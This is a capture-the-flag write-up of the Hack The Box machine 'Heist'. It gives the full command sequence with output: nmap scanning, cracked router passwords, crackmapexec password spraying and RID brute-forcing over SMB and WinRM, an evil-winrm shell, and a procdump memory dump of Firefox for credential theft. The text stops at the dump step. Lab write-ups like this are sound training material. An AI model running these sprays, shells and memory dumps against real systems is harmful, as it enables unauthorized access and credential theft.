---
title: "Heist HTB"
date: 2023-04-01T12:25:19-07:00
draft: false
---

![](https://0xrick.github.io/images/hackthebox/heist/0.png)
# Recon
`sudo nmap -sU -sS --min-rate=10000 10.10.10.149`


~~~bash
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
445/tcp open  microsoft-ds
~~~

Going to the site, it allows you to login as guest and see the issues. You get a configs.txt file in the attachments as well as the admin password hash. 

# Passwords
`admin   02375012182C1A1D751618034F36415408`
`rout3r  0242114B0E143F015F5D1E161713`
`$1$pdQG$o8nrSzsGXeaduXrjlvKc91`
you get the passowrd: `Q4)sJu\Y8qz*A3?d` for admin and `$uperP@ssword` for rout3r
you also get an md5 password `stealth1agent`
using a tool like `crackmapexec` and usernames like admin, rout3r, and hazard you should be able to crack smb

# SMB
`crackmapexec smb 10.10.10.149 -u usernames.txt -p passwords.txt`

~~~bash
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
~~~

valid creds! but upon further examination they only let authentication and nothing else.

`crackmapexec smb 10.10.10.149 -u usernames.txt -p passwords.txt --rid-brute`

~~~bash
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs
SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
~~~

using the usernames gathered there is a valid creds for winrm
`crackmapexec winrm 10.10.10.149 -u usernames.txt -p passwords.txt `

~~~bash
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\Administrator:Q4)sJu\Y8qz*A3?d
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\Administrator:stealth1agent
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\administrator:$uperP@ssword
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\administrator:Q4)sJu\Y8qz*A3?d
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\administrator:stealth1agent
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\support:$uperP@ssword
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\support:stealth1agent
WINRM       10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\chase:$uperP@ssword
WINRM       10.10.10.149    5985   SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)

~~~

# Foothold
`evil-winrm -u chase -p "Q4)sJu\Y8qz*A3?d" -i 10.10.10.149`
you get a shell!

upon looking for interesting files there is todo.txt on the desktop dir
~~~bash
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
~~~

# Priv esc

looking for process like firefox or chrome allows you to possibly get the data or dump the process
`get-process -name firefox`
and it is running.

~~~powershell
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    401      34    33960      91728       1.13   3636   1 firefox
   1074      69   132720     209028       8.52   5676   1 firefox
    347      19    10236      36748       0.08   5860   1 firefox
    378      28    21744      58392       0.84   6312   1 firefox
    355      25    16448      39104       0.11   6688   1 firefox

~~~
to dump the process you will need procdump

to upload it 
`upload procdump.exe C:\Users\Chase\Desktop\`

to dump process
`.\procdump.exe -accepteula -ma 5676 firefox_dump.dmp`
